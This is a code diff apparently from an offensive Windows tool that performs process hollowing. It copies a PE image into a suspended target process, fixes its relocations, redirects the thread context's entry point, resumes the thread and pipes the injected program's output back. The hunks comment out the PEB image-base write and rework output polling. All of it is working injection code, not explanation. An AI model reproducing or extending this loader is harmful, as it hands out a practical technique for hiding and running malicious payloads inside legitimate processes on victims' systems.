@@ -17,10 +17,10 @@ _NtSetContextThread myNtSetContextThread = (_NtSetContextThread)GetProcAddress(G
 
 
 
-bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, PPE_STRUCT myPE)
+bool copyPEinTargetProcess(HANDLE pHandle, LPVOID allocAddrOnTarget, PPE_STRUCT myPE)
 {
 
-	myPE->ntHeader->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
+	//myPE->ntHeader->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
 	_dbg("[+] Writing Header into target process\r\n");
 	NTSTATUS status = myNtWrite(pHandle, allocAddrOnTarget, myPE->imageBase, myPE->ntHeader->OptionalHeader.SizeOfHeaders, NULL);
 	if (status != 0)
@@ -60,7 +60,7 @@ bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, PPE_STRUCT
 	return TRUE;
 }
 
-bool fixRelocTable(HANDLE pHandle, PPE_STRUCT myPE, LPVOID& allocAddrOnTarget, DWORD64 DeltaImageBase)
+bool fixRelocTable(HANDLE pHandle, PPE_STRUCT myPE, PVOID allocAddrOnTarget, DWORD64 DeltaImageBase)
 {
 	_dbg("[+] Fixing relocation table.\n");
 	PPE_SECTION relocSection = getSection(myPE, (PCHAR)".reloc");
@@ -71,8 +71,7 @@ bool fixRelocTable(HANDLE pHandle, PPE_STRUCT myPE, LPVOID& allocAddrOnTarget, D
 	}
 
 	DWORD RelocOffset = 0;
-	DWORD sizeF = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-	while (RelocOffset < sizeF)
+	while (RelocOffset < myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
 	{
 		PIMAGE_BASE_RELOCATION currentReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)myPE->imageBase + relocSection->header->PointerToRawData + RelocOffset);
 		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
@@ -673,12 +672,12 @@ BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myP
 		return FALSE;
 	}
 
-	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
-	if (status != 0)
-	{
-		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
-		return FALSE;
-	}
+	//status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &allocAddrOnTarget, sizeof(DWORD64), nullptr);
+	//if (status != 0)
+	//{
+	//	_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
+	//	return FALSE;
+	//}
 
 	CTX.Rcx = (DWORD64)allocAddrOnTarget + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
 
@@ -698,18 +697,28 @@ BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myP
 	return TRUE;
 }
 
-BOOL retrieveOutPut(HANDLE hThread, HANDLE hStdOut, PVOID* commandOutput,PDWORD bytesSize)
+BOOL retrieveOutPut(HANDLE hThread, HANDLE hStdOut)
 {
-	DWORD timeout = INFINITE;
-	NTSTATUS status = myNtWaitForSingleObject(hThread, FALSE, PLARGE_INTEGER(&timeout));
-	if (status != 0)
-	{
-		_err("Error in waiting thread: %x\r\n", status);
-		return FALSE;
+	DWORD timeout = 100;
+	PVOID commandOutput = nullptr;
+	DWORD bytesSize = 0;
+	//NTSTATUS status = myNtWaitForSingleObject(hThread, FALSE, PLARGE_INTEGER(&timeout));
+	while (WaitForSingleObject(hThread, 100) != WAIT_OBJECT_0) {
+		readPipe(hStdOut, &commandOutput, &bytesSize);
+		if (bytesSize > 0)
+		{
+			printf("%s\r\n", commandOutput);
+			DATA_FREE(commandOutput, bytesSize);
+		}
 	}
 
+
 	// Reading output one last time to check we don't leave anything behind...
-	readPipe(hStdOut, commandOutput, bytesSize);
+	readPipe(hStdOut, &commandOutput, &bytesSize);
+	if (bytesSize > 0)
+	{
+		printf("%s\r\n", commandOutput);
+	}
 	return TRUE;
 }
 
@@ -787,11 +796,8 @@ int main(int argc, char** argv)
 
 	PVOID output = nullptr;
 	DWORD bytesSize = 0;
-	if (!retrieveOutPut(pi->hThread, hStdOut, &output, &bytesSize))
+	if (!retrieveOutPut(pi->hThread, hStdOut))
 		exit(1);
-
-	if (bytesSize > 0)
-		printf("%s\r\n", output);
 
 
 	return 0;
